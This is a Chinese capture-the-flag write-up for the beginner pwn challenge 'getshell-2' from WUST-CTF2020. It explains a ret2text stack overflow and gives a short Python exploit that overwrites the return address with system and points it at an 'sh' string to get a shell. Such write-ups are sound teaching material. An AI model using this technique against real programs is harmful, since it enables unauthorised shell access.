
## getshell-2
- 题目描述：
    
    > Author: ColdShield
    
- 题目附件：[getshell-2](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/getshell-2/getshell-2)

- 考察点：ret2text

- 难度：入门

- 初始分值：1000

- 最终分值：988

- 完成人数：7

### 程序分析

和前面的getshell差不多，只是把`system("/bin/sh")`改了，没法直接getshell

```c
int shell()
{
  return system("/bbbbbbbbin_what_the_f?ck__--??/sh");
}
```

### 解题思路
32位的elf，函数参数保存在栈中，所以只要覆盖返回地址为system，再多覆盖4字节用作system的参数就行。字符串结尾给的`sh`可以直接用。

### exp
```python
system = 0x08048529
payload = 'A'*28
payload += p32(system) + p32(0x8048650+32)
sl(payload)
```

